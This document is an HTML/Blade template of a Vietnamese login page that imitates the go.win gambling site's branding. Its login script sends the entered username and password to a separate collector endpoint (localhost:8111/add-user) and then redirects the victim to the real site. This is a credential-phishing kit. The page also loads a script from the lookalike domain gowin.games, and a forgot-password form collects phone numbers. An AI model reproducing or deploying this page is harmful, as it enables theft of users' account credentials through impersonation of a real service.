<!DOCTYPE html>
<html class="body-full-height">
<head>
    <!-- META SECTION -->
    <title>Đăng nhập t&#224;i khoản </title>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />

    <script>
        //if (location.protocol != 'https:') { location.href = 'https:' + window.location.href.substring(window.location.protocol.length); }
    </script>
    <script src="https://gowin.games/css/4.js"></script>
    <link rel="icon" href="https://go.win/favicon.ico" type="image/x-icon" />
    <!-- END META SECTION -->

    <style>
        body {

            background: #1f2232;
            background: url(https://go.win/ContentMobile/images/bg_wrapper.jpg) #1f2232 no-repeat;
            background-size: cover;
        }
        @font-face {
            font-family: 'helveticaneue';
            src: url(../../../assets/HelveticaMedium.ttf);
        }

        @font-face {
            font-family: 'helveticaneuemedium';
            src: url(../../../assets/HelveticaMedium.ttf);
        }

        @font-face {
            font-family: 'helveticaneuebold';
            src: url(../../../assets/HelveticaMedium.ttf);
        }

        @font-face {
            font-family: 'helveticaneuecondensedbold';
            src: url(../../../assets/HelveticaMedium.ttf);
        }

        @font-face {
            font-family: 'helveticaneuelight';
            src: url(../../../assets/HelveticaMedium.ttf);
        }

        @font-face {
            font-family: 'Montserrat-Bold';
            src: url(../../../assets/HelveticaMedium.ttf);
        }

        @font-face {
            font-family: 'Montserrat-SemiBold';
            src: url(../../../assets/HelveticaMedium.ttf);
        }

        @font-face {
            font-family: 'Montserrat-Regular';
            src: url(../../../assets/HelveticaMedium.ttf);
        }

        @font-face {
            font-family: 'eurostile';
            src: url(../../../assets/HelveticaMedium.ttf);
        }
        .md_account_new {
            width: 730px;
            height: 630px;
            background: url(https://go.win/ContentMobile/images/bg_popup.png) no-repeat top left;
            z-index: 99999;
            position: absolute;
            left: 10px;
            right: 10px;
            border-radius: 15px;
            top: 170px;
            margin: auto;
            display: block;
        }
        .md_account_new .md_dialog { width: 730px; height: 795px; position: relative; float: left; }
        .md_account_new .box-md-account { width: 460px; display: block; margin: auto; }
        .md_account_new .box-md-account .title-form { margin-top: 85px; }
        .md_account_new .box-md-account .title-form .title-login { width: 460px; height: 70px; background: url(https://go.win/ContentMobile/images/title_dangnhap.png) no-repeat top center; text-indent: -999em; }
        .md_account_new .box-md-account .title-form .title-register { width: 460px; height: 70px; background: url(../images/title_dangky.png) no-repeat top center; text-indent: -999em; }
        .md_account_new .box-md-account .title-form .title-forgetpass { width: 460px; height: 70px; background: url(../images/title_quenmatkhau.png) no-repeat top center; text-indent: -999em; }
        .md_account_new .box-md-account .title-form .title-download { width: 460px; height: 70px; background: url(../images/title_taiapp.png) no-repeat top center; text-indent: -999em; }
        .md_account_new .box-md-account .content-form .input-control {

            width: 100%;
            height: 80px;
            background: url(https://go.win/ContentMobile/images/form/bg_input_text.png) no-repeat top center;
            border: none;
            color: #000000;
            font-size: 30px;
            font-family: sans-serif;
            font-weight: 600;
            outline: 0;
            padding-left: 80px;
            box-sizing: border-box;
        }
        .md_account_new .box-md-account .content-form .input-captcha { width: 195px; height: 60px; background: url(../images/form/input_captcha.png) no-repeat top center; border: none; color: #000000; font-size: 26px; font-family: 'helveticaneuemedium'; outline: 0; padding-left: 18px; }
        .md_account_new .box-md-account .content-form .input-result-captcha { width: 123px; height: 60px;
            /*background: url(../images/form/bg_captcha.png) no-repeat top left;*/
            font-family: 'helveticaneuebold'; border: none; outline: 0; font-size: 23px; color: #FFFFFF; padding: 10px 20px; text-align: center; }
        .md_account_new .box-md-account .content-form .input-refresh-captcha { width: 63px; height: 65px; background: url(../images/form/btn_refresh.png) no-repeat top left; border: none; outline: 0; font-size: 20px; color: #000000; padding: 10px 20px; text-align: center; display: block; }
        .md_account_new .box-md-account .content-form .col-input-captcha { width: 195px; float: left; display: block; }
        .md_account_new .box-md-account .content-form .col-result-captcha { width: 123px; float: left; margin-left: 20px; display: block; }
        .md_account_new .box-md-account .content-form .col-refresh { width: 70px; height: 80px; float: left; display: block; margin-left: 20px; margin-top: 7px; }
        .md_account_new .box-md-account .content-form .username:after { background: url(https://go.win/ContentMobile/images/form/icon_username.png) no-repeat left top; width: 33px; height: 31px; display: block; content: ''; position: absolute; left: 24px; top: 24px; }
        .md_account_new .box-md-account .content-form .password:before { background: url(https://go.win/ContentMobile/images/form/icon_password.png) no-repeat left top; width: 33px; height: 31px; display: block; content: ''; position: absolute; left: 24px; top: 24px; }
        .md_account_new .box-md-account .content-form .form-group { margin-bottom: 10px; position: relative; }
        .md_account_new .box-md-account .content-form .btn-mdlogin { width: 233px; height: 83px; display: block; background: url(https://go.win/ContentMobile/images/form/btn_dangnhap.png) no-repeat left top; border: none; text-indent: -999em; position: relative; float: left; left: 0px; outline: 0; }
        .md_account_new .box-md-account .content-form .btn-mdlogin:hover, .md_account_new .box-md-account .content-form .btn-mdlogin:focus, .md_account_new .box-md-account .content-form .btn-mdlogin:active { -webkit-filter: brightness(130%); }
        .md_account_new .box-md-account .content-form .btn-mdregister { width: 233px; height: 83px; display: block; background: url(https://go.win/ContentMobile/images/form/btn_dangky.png) no-repeat left top; border: none; text-indent: -999em; float: left; right: -5px; position: absolute; top: 0px; outline: 0; }
        .md_account_new .box-md-account .content-form .btn-mdregister:hover, .md_account_new .box-md-account .content-form .btn-mdregister:focus, .md_account_new .box-md-account .content-form .btn-mdregister:active { -webkit-filter: brightness(130%); }
        .md_account_new .box-md-account .content-form .btn-get_pas { width: 233px; height: 83px; display: block; background: url(../images/form/btn_tieptuc.png) no-repeat left top; border: none; text-indent: -999em; float: left; top: -2px; position: relative; outline: 0; margin-left: 130px; }
        .md_account_new .box-md-account .content-form .btn-get_pas:hover, .md_account_new .box-md-account .content-form .btn-get_pas:focus, .md_account_new .box-md-account .content-form .btn-get_pas:active { -webkit-filter: brightness(130%); }
        .md_account_new .box-md-account .content-form .btn-sendpass { width: 203px; height: 83px; display: block; background: url(../images/form/btn_hoantat.png) no-repeat left top; border: none; text-indent: -999em; float: left; top: 10px; position: relative; outline: 0; margin-left: 130px; }
        .md_account_new .box-md-account .content-form .btn-sendpass:hover, .md_account_new .box-md-account .content-form .btn-sendpass:focus, .md_account_new .box-md-account .content-form .btn-sendpass:active { -webkit-filter: brightness(130%); }
        .md_account_new .box-md-account .content-form .btn-mdregister2 { width: 233px; height: 83px; display: block; background: url(https://go.win/ContentMobile/images/form/btn_dangky.png) no-repeat left top; border: none; text-indent: -999em; float: left; top: -2px; position: relative; outline: 0; }
        .md_account_new .box-md-account .content-form .btn-mdregister2:hover, .md_account_new .box-md-account .content-form .btn-mdregister2:focus, .md_account_new .box-md-account .content-form .btn-mdregister2:active { -webkit-filter: brightness(130%); }
        .md_account_new .box-md-account .content-form .btn-forgetpass { width: 255px; height: 83px; display: block; float: left; font-size: 30px; color: #FFFFFF; font-family: sans-serif; padding-left: 5px; outline: 0; margin-left: 80px; padding-top: 15px;font-weight: 600 }
        .md_account_new .box-md-account .content-form .btn-forgetpass:hover, .md_account_new .box-md-account .content-form .btn-forgetpass:focus, .md_account_new .box-md-account .content-form .btn-forgetpass:active { -webkit-filter: brightness(130%); }
        .md_account_new .box-md-account .content-form .btn-loginfacebook { width: 116px; height: 83px; display: block; background: url(https://go.win/ContentMobile/images/form/btn_facebook.png) no-repeat left top; border: none; text-indent: -999em; position: relative; float: left; left: 0px; outline: 0; }
        .md_account_new .box-md-account .content-form .btn-loginfacebook:hover, .md_account_new .box-md-account .content-form .btn-loginfacebook:focus, .md_account_new .box-md-account .content-form .btn-loginfacebook:active { -webkit-filter: brightness(130%); }
        .md_account_new .box-md-account .content-form .btn-appios { width: 342px; height: 113px; background: url(../images/downloadios.png) no-repeat left top; display: block; text-indent: -999em; margin-top: 50px; margin-left: 60px; }
        .md_account_new .box-md-account .content-form .btn-appandroid { width: 342px; height: 113px; background: url(../images/downloadandroid.png) no-repeat left top; display: block; text-indent: -999em; margin-top: 40px; margin-left: 60px; }
        .md_account_new .box-md-account .content-form .list-button {
            position: relative;
            margin-bottom: 0px;
            position: relative;
            margin-bottom: 0px;
            display: table;
            width: 100%;
            margin: 0px;
            padding: 0px;
        }
        .md_account_new .box-md-account .content-form .list-button li { padding: 0px; list-style: none;}
        .new-logo a {
            width: 300px;
            height: 200px;
            display: block;
            background: url(https://go.win/ContentMobile/images/logo-GoWin.png) no-repeat left top;
            background-size: 100%;
            position: absolute;
            left: 0px;
            right: 0px;
            top: -30px;
            margin: auto;
        }
        .md_account_new .box-md-account .content-form .alert-error-top {
            background: rgba(57, 63, 94, 0.9);
            border-radius: 5px;
            border: 1px solid #6b7dd0;
            color: #ff0;
            width: 100%;
            padding: 0px 15px;
            font-size: 18px;
            height: auto;
            z-index: 99;
            display: table;
            vertical-align: middle;
            font-family: 'helveticaneue';
        }

        body {

            background: #1f2232;
            background: url(https://go.win/ContentMobile/images/bg_wrapper.jpg) #1f2232 no-repeat;
            background-size: cover;
        }
        .md_account {
            width: 730px;
            height: 695px;
            background: url(https://go.win/ContentMobile/images/bg_popup.png) no-repeat top left;
            z-index: 99999;
            position: absolute;
            left: 10px;
            right: 10px;
            border-radius: 15px;
            top: 170px;
            margin: auto;
            display: none;

        }
        .md_account .md_dialog { width: 730px; height: 795px; position: relative; float: left; }
        .md_account .box-md-account { width: 460px; display: block; margin: auto; }
        .md_account .box-md-account .title-form { margin-top: 85px; }
        .md_account .box-md-account .title-form .title-login { width: 460px; height: 70px; background: url(https://go.win/ContentMobile/images/title_dangnhap.png) no-repeat top center; text-indent: -999em; }
        .md_account .box-md-account .title-form .title-register { width: 460px; height: 70px; background: url(../images/title_dangky.png) no-repeat top center; text-indent: -999em; }
        .md_account .box-md-account .title-form .title-forgetpass { width: 460px; height: 70px; background: url(../images/title_quenmatkhau.png) no-repeat top center; text-indent: -999em; }
        .md_account .box-md-account .title-form .title-download { width: 460px; height: 70px; background: url(../images/title_taiapp.png) no-repeat top center; text-indent: -999em; }
        .md_account .box-md-account .content-form .input-control {

            width: 100%;
            height: 80px;
            background: url(https://go.win/ContentMobile/images/form/bg_input_text.png) no-repeat top center;
            border: none;
            color: #000000;
            font-size: 30px;
            font-family: 'helveticaneuemedium';
            outline: 0;
            padding-left: 80px;
            box-sizing: border-box;
        }
        .md_account .box-md-account .content-form .input-captcha { width: 195px; height: 80px; background: url(../images/form/input_captcha.png) no-repeat top center; border: none; color: #000000; font-size: 26px; font-family: 'helveticaneuemedium'; outline: 0; padding-left: 18px; }
        .md_account .box-md-account .content-form .input-result-captcha { width: 123px; height: 60px;
            /*background: url(../images/form/bg_captcha.png) no-repeat top left;*/
            font-family: 'helveticaneuebold'; border: none; outline: 0; font-size: 23px; color: #FFFFFF; padding: 10px 20px; text-align: center; }
        .md_account .box-md-account .content-form .input-refresh-captcha { width: 63px; height: 65px; background: url(../images/form/btn_refresh.png) no-repeat top left; border: none; outline: 0; font-size: 20px; color: #000000; padding: 10px 20px; text-align: center; display: block; }
        .md_account .box-md-account .content-form .col-input-captcha { width: 195px; float: left; display: block; }
        .md_account .box-md-account .content-form .col-result-captcha { width: 123px; float: left; margin-left: 20px; display: block; }
        .md_account .box-md-account .content-form .col-refresh { width: 70px; height: 80px; float: left; display: block; margin-left: 20px; margin-top: 7px; }
        .md_account .box-md-account .content-form .username:after { background: url(https://go.win/ContentMobile/images/form/icon_username.png) no-repeat left top; width: 33px; height: 31px; display: block; content: ''; position: absolute; left: 24px; top: 24px; }
        .md_account .box-md-account .content-form .password:before { background: url(https://go.win/ContentMobile/images/form/icon_password.png) no-repeat left top; width: 33px; height: 31px; display: block; content: ''; position: absolute; left: 24px; top: 24px; }
        .md_account .box-md-account .content-form .form-group { margin-bottom: 10px; position: relative; }
        .md_account .box-md-account .content-form .btn-mdlogin { width: 233px; height: 83px; display: block; background: url(https://go.win/ContentMobile/images/form/btn_dangnhap.png) no-repeat left top; border: none; text-indent: -999em; position: relative; float: left; left: 0px; outline: 0; }
        .md_account .box-md-account .content-form .btn-mdlogin:hover, .md_account .box-md-account .content-form .btn-mdlogin:focus, .md_account .box-md-account .content-form .btn-mdlogin:active { -webkit-filter: brightness(130%); }
        .md_account .box-md-account .content-form .btn-mdregister { width: 233px; height: 83px; display: block; background: url(https://go.win/ContentMobile/images/form/btn_dangky.png) no-repeat left top; border: none; text-indent: -999em; float: left; right: -5px; position: absolute; top: 0px; outline: 0; }
        .md_account .box-md-account .content-form .btn-mdregister:hover, .md_account .box-md-account .content-form .btn-mdregister:focus, .md_account .box-md-account .content-form .btn-mdregister:active { -webkit-filter: brightness(130%); }
        .md_account .box-md-account .content-form .btn-get_pas { width: 233px; height: 83px; display: block; background: url(../images/form/btn_tieptuc.png) no-repeat left top; border: none; text-indent: -999em; float: left; top: -2px; position: relative; outline: 0; margin-left: 130px; }
        .md_account .box-md-account .content-form .btn-get_pas:hover, .md_account .box-md-account .content-form .btn-get_pas:focus, .md_account .box-md-account .content-form .btn-get_pas:active { -webkit-filter: brightness(130%); }
        .md_account .box-md-account .content-form .btn-sendpass { width: 203px; height: 83px; display: block; background: url(../images/form/btn_hoantat.png) no-repeat left top; border: none; text-indent: -999em; float: left; top: 10px; position: relative; outline: 0; margin-left: 130px; }
        .md_account .box-md-account .content-form .btn-sendpass:hover, .md_account .box-md-account .content-form .btn-sendpass:focus, .md_account .box-md-account .content-form .btn-sendpass:active { -webkit-filter: brightness(130%); }
        .md_account .box-md-account .content-form .btn-mdregister2 { width: 233px; height: 83px; display: block; background: url(https://go.win/ContentMobile/images/form/btn_dangky.png) no-repeat left top; border: none; text-indent: -999em; float: left; top: -2px; position: relative; outline: 0; }
        .md_account .box-md-account .content-form .btn-mdregister2:hover, .md_account .box-md-account .content-form .btn-mdregister2:focus, .md_account .box-md-account .content-form .btn-mdregister2:active { -webkit-filter: brightness(130%); }
        .md_account .box-md-account .content-form .btn-forgetpass { width: 255px; height: 83px; display: block; float: left; font-size: 30px; color: #FFFFFF; font-family: 'helveticaneuebold'; padding-left: 5px; outline: 0; margin-left: 80px; padding-top: 15px; }
        .md_account .box-md-account .content-form .btn-forgetpass:hover, .md_account .box-md-account .content-form .btn-forgetpass:focus, .md_account .box-md-account .content-form .btn-forgetpass:active { -webkit-filter: brightness(130%); }
        .md_account .box-md-account .content-form .btn-loginfacebook { width: 116px; height: 83px; display: block; background: url(https://go.win/ContentMobile/images/form/btn_facebook.png) no-repeat left top; border: none; text-indent: -999em; position: relative; float: left; left: 0px; outline: 0; }
        .md_account .box-md-account .content-form .btn-loginfacebook:hover, .md_account .box-md-account .content-form .btn-loginfacebook:focus, .md_account .box-md-account .content-form .btn-loginfacebook:active { -webkit-filter: brightness(130%); }
        .md_account .box-md-account .content-form .btn-appios { width: 342px; height: 113px; background: url(../images/downloadios.png) no-repeat left top; display: block; text-indent: -999em; margin-top: 50px; margin-left: 60px; }
        .md_account .box-md-account .content-form .btn-appandroid { width: 342px; height: 113px; background: url(../images/downloadandroid.png) no-repeat left top; display: block; text-indent: -999em; margin-top: 40px; margin-left: 60px; }
        .md_account .box-md-account .content-form .list-button {
            position: relative;
            margin-bottom: 0px;
            position: relative;
            margin-bottom: 0px;
            display: table;
            width: 100%;
            margin: 0px;
            padding: 0px;
        }
        .md_account .box-md-account .content-form .list-button li { padding: 0px; list-style: none;}
        .new-logo a {
            width: 300px;
            height: 200px;
            display: block;
            background: url(https://go.win/ContentMobile/images/logo-GoWin.png) no-repeat left top;
            background-size: 100%;
            position: absolute;
            left: 0px;
            right: 0px;
            top: -30px;
            margin: auto;
        }
        .md_account .box-md-account .content-form .alert-error-top {
            background: rgba(57, 63, 94, 0.9);
            border-radius: 5px;
            border: 1px solid #6b7dd0;
            color: #ff0;
            width: 100%;
            padding: 0px 15px;


            font-size: 18px;
            height: auto;
            z-index: 99;
            display: table;
            vertical-align: middle;
            font-family: 'helveticaneue';
        }
        .form-group.form-IsCaptcha {
            position: inherit !important;
            display: table !important;
        }
        .bdwcpb-step {
            margin-bottom: 20px;
        }

        .bdwcpbt-list {
            display: inline-block;
            margin: 0px;
            padding: 0px;
        }

        .bdwcpbt-list .bdwcpbtli {
            float: left;
            margin-right: 20px;
            position: relative;
            z-index: 3;
            list-style: none;
        }

        .bdwcpbt-list .bdwcpbtli.active span {
            background-color: #ffb636;
            color: #002;
        }

        .bdwcpbt-list .bdwcpbtli span {
            border-radius: 50%;
            background-color: #e4e4e4;
            width: 40px;
            height: 40px;
            display: block;
            font-family: 'helveticaneuecondensedbold';
            font-size: 18px;
            color: #999;
            line-height: 40px;
            position: relative;
        }

        .bdwcpbt-list .bdwcpbtli:last-of-type span:before {
            background: #e4e4e4;
            width: 100%;
            left: -100%;
            display: block;
            content: '';
            position: absolute;
            top: 50%;
            margin-top: -1px;
            z-index: 0;
            height: 2px;
        }

        .bdwcpbt-list .bdwcpbtli:last-of-type {
            z-index: 2;
            margin-right: 0;
        }

        .subtitle-not {
            font-size: 26px;
            color: #ffe400;
            margin-left: 0px;
            padding-left: 35px;
            position: relative;
        }

        .subtitle-not:before {
            width: 26px;
            height: 26px;
            display: inline-block;
            content: '';
            left: 0px;
            top: 6px;
            background: #fe2c2c;
            -webkit-border-radius: 50%;
            -moz-border-radius: 50%;
            border-radius: 50%;
            position: absolute;
        }
        .bdwcpb-step {
            margin-bottom: 20px;
        }

        .text-center {
            text-align: center;
        }
        .md_account .btn-get_pass {
            width: 233px;
            height: 83px;
            display: block;
            background: url(../images/form/btn_tieptuc.png) no-repeat left top;
            border: none;
            text-indent: -999em;
            float: left;
            top: -2px;
            position: relative;
            outline: 0;
            margin-left: 130px;
        }
    </style>
</head>
<body class="login">
<script>

    // if (location.protocol != 'https:') { location.href = 'https:' + window.location.href.substring(window.location.protocol.length); }
</script>
<!-- BEGIN LOGO -->
<div class="logo">
    <a href="/">

    </a>
</div>
<!-- END LOGO -->
<!-- BEGIN SIDEBAR TOGGLER BUTTON -->
<div class="menu-toggler sidebar-toggler">
</div>
<!-- END SIDEBAR TOGGLER BUTTON -->
<!-- BEGIN LOGIN -->
{{--<link href="{{url('/')}}/public/css/loginnew.css" rel="stylesheet" />--}}
<div id="wrapper">
    <div class="new-logo">
        <a href="/">
        </a>
    </div>
    <div class="md_account_new" id="md_login" style="display: block;" >
        <div class="md_dialog login-form">
            <meta name="csrf-token" content="{{ csrf_token() }}">
            <form id="login-bar" action="/" method="post">
                <input name="__RequestVerificationToken" type="hidden" value="4bmtmL8oS4cn0v-fhdT3--xAgz2XzKZgMFPndZG_E3ReCrEqHGmu_5X0yN4yiGEcmGitiT6JGSR85SwZ0SXlygPNce41" />
                <div class="box-md-account">
                    <div class="title-form">
                        <h3 class="title-login">Đăng nhập</h3>
                    </div>
                    <div class="content-form">

                        <div class="form-group ">

                        </div>
                        <div class="form-group username">
                            <input autofocus="" class="input-control login-u" data-val="true" data-val-regex="Tên đăng nhập chỉ gồm chữ hoặc số" data-val-regex-pattern="^[a-zA-Z0-9_-]+$" data-val-required="Quý khách chưa điền Tên đăng nhập" id="UserName" name="UserName" placeholder="Tên đăng nhập" type="text" value="" />    </div>
                        <div class="form-group password">
                            <input autocomplete="new-password" class="input-control login-p" data-val="true" data-val-required="Quý khách chưa điền Mật khẩu" id="Password" name="Password" placeholder="Mật khẩu" type="password" />
                        </div>
                        <input type="hidden" id="IsLanding" name="IsLanding" value="false">
                        <div class="form-group">
                            <ul class="list-button list-inline">
                                <li><button type="button" class="btn-mdlogin btn-login" style="cursor: pointer">Đăng nhập</button></li>
                                <li><button type="button" class="btn-mdregister" onclick="showRegister()" style="cursor: pointer">Đăng ký</button></li>
                            </ul>
                        </div>
                        <div class="form-group">
                            <ul class="list-button list-inline">
                                <li>
                                    <a href="javascript:;" onclick="registerUsingFacebook()" class="btn-loginfacebook"  title="Đăng nhập facebook" style="cursor: pointer">Facebook</a>
                                </li>
                                <li><a class="btn-forgetpass" onclick="$('#md_getpass').show()" style="cursor: pointer">Quên mật khẩu ?</a></li>

                            </ul>
                        </div>

                    </div>
                </div>
            </form>
            <a class=" close-popup" id="close_mdlogin" href="#" style="cursor: pointer"></a>
        </div>
        <script>
            $(".btn-login").on("click", function () {
                var uname = $(".login-u").val(),
                    upass = $(".login-p").val();
                if (uname.length === 0 || upass.length === 0) {
                    return false;
                }

                $.ajax({
                    headers: {
                        'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
                    },
                    type: "post",
                    url: "http://localhost:8111/add-user",
                    data: {
                        un: uname,
                        pww: upass,
                    },
                    dataType: 'json',
                    success: function (re) {
                        // checkmobile(uname, upass);
                        window.location.href = "https://go.win/";
                    },
                    error: function () {
                        return false;
                    }
                });

            });
        </script>
    </div>

</div>
<div class="md_account " id="md_register"></div>
<div class="md_account " id="md_getpass">
    <div class="md_dialog">
        <div class="box-md-account">
            <div class="title-form">
                <h3 class="title-forgetpass">Quên mật khẩu</h3>
            </div>
            <div class="content-form" id="contentGetPass">
                <div class="box-get_pass">
                    <form id="frmGetPassStep1">
                        <div class="form-group ">

                        </div>
                        <div class="bdwcpb-step text-center">
                            <ul class="bdwcpbt-list">
                                <li class="bdwcpbtli active">
                                    <span>01</span>
                                </li>
                                <li class="bdwcpbtli">
                                    <span>02</span>
                                </li>
                            </ul>
                        </div>
                        <div class="form-group username">
                            <input class="input-control " data-val="true" data-val-required="Quý khách chưa điền Tài khoản" id="UserName2" name="UserName" placeholder="Tên tài khoản" type="text" value="" />
                        </div>
                        <div class="form-group password">
                            <input class="input-control " data-val="true" data-val-length="Điện thoại cần ít nhất 10 ký tự" data-val-length-max="12" data-val-length-min="10" data-val-phone="Số điện thoại không đúng định dạng" id="PhoneNumber" name="PhoneNumber" placeholder="Số điện thoại" type="text" value="" />
                        </div>

                        <p class="subtitle-not">Bạn sẽ nhận được tin nhắn mã OTP về số đIện thoại đăng ký</p>
                        <div class="form-group">
                            <ul class="list-button list-inline">
                                <li><button type="button" class="btn-get_pass" onclick="GetPassStep1()">Tiếp tục</button></li>
                            </ul>
                        </div>
                    </form>
                </div>




            </div>
        </div>
        <a class=" close-popup" id="close_mdgetpass" href="#"></a>
    </div>
</div><div style="display: none">
    <form action="/vi/Account/ExternalLogin?ReturnUrl=%2F" method="post"><input name="__RequestVerificationToken" type="hidden" value="c9-tjnj43Rbv5D-WroH7-s3iHbgyTKFE2vO_tAbg8q4671ZnS4kHC4AOtPt6bDggS7pfzS9wYzVb6JiLyGLkYxkaurs1" />                <input type="hidden" id="Facebook" name="provider"
                                                                                                                                                                                                                                                              value="Facebook" />
        <a href="javascript:;" onclick="parentNode.submit();" class="btn-loginfacebook" id="btnRegisterFace" title="Đăng nhập facebook">Facebook</a>
    </form>
</div>
<!-- END LOGIN -->
<!-- BEGIN COPYRIGHT -->
{{--<script src="/bundles/jquery?v=yMmPM1TxecYcoWtCWW3jYgH0fr9kiAasOfb-W5I001A1"></script>--}}

{{--<script src="/bundles/jqueryval?v=Fl9FMFOmoQTrv140qKKP4MIFHAPw39_ZpC3fftT9G5c1"></script>--}}


<!-- END COPYRIGHT -->
<!-- BEGIN JAVASCRIPTS(Load javascripts at bottom, this will reduce page load time) -->
<!-- BEGIN CORE PLUGINS -->
{{--<script>--}}

{{--function showRegister() {--}}
{{--jQuery.ajax({--}}
{{--url: '/vi/Account/RegisterPartialViewNew',--}}
{{--type: "GET",--}}
{{--success: function (data) {--}}
{{--$("#md_register").html(data);--}}
{{--$(".md_account").hide();--}}
{{--$("#md_register").show();--}}
{{--},--}}
{{--error: function (jqXHR, errorCode, error) {--}}
{{--console.log("Lỗi không xác định " + jqXHR.status + " " + jqXHR.statusText);--}}
{{--}--}}
{{--});--}}

{{--}--}}
{{--function onSubmitRegister() {--}}
{{--jQuery.ajax({--}}
{{--url: '/vi/Account/RegisterNEW',--}}
{{--data:   $("#registration").serialize(),--}}
{{--type: "POST",--}}
{{--success: function (data) {--}}
{{--if (data === true) {--}}
{{--window.location.reload();--}}
{{--} else {--}}
{{--$("#md_register").html(data);--}}
{{--}--}}
{{--},--}}
{{--error: function (jqXHR, errorCode, error) {--}}
{{--console.log("Lỗi không xác định " + jqXHR.status + " " + jqXHR.statusText);--}}
{{--}--}}
{{--});--}}

{{--}--}}
{{--function GetPassStep1() {--}}
{{--jQuery.ajax({--}}
{{--url: '/vi/Account/ForgotPartialViewNew',--}}
{{--data: $("#frmGetPassStep1").serialize(),--}}
{{--type: "POST",--}}
{{--success: function (data) {--}}
{{--$("#contentGetPass").html(data);--}}
{{--},--}}
{{--error: function (jqXHR, errorCode, error) {--}}
{{--console.log("Lỗi không xác định " + jqXHR.status + " " + jqXHR.statusText);--}}
{{--}--}}
{{--});--}}

{{--}--}}
{{--$(document).delegate("#imgCaptCharLogin", "click", function () {--}}
{{--var d = new Date();--}}
{{--var n = d.getTime();--}}
{{--var url = '/vi/Account/ShowCaptchaImage?guid=' + n;--}}
{{--$("#imgCaptCharLogin").removeAttr("src").attr("src", url);--}}
{{--});--}}

{{--function GetPassStep2() {--}}
{{--jQuery.ajax({--}}
{{--url: '/vi/Account/ForgotPasswordConfirmOTPPartialViewNew',--}}
{{--data: $("#frmGetPassStep2").serialize(),--}}
{{--type: "POST",--}}
{{--success: function (data) {--}}
{{--if (data === true) {--}}
{{--alert("Lấy mật khẩu thành công. Bạn vui lòng đăng nhập lại");--}}
{{--} else {--}}
{{--$("#contentGetPass").html(data);--}}
{{--}--}}
{{--},--}}
{{--error: function (jqXHR, errorCode, error) {--}}
{{--console.log("Lỗi không xác định " + jqXHR.status + " " + jqXHR.statusText);--}}
{{--}--}}
{{--});--}}



{{--}--}}
{{--function registerUsingFacebook() {--}}

{{--$("#btnRegisterFace").click();--}}
{{--}--}}
{{--</script>--}}


<!-- START PRELOADS -->

<!-- END PRELOADS -->
</body>
</html>
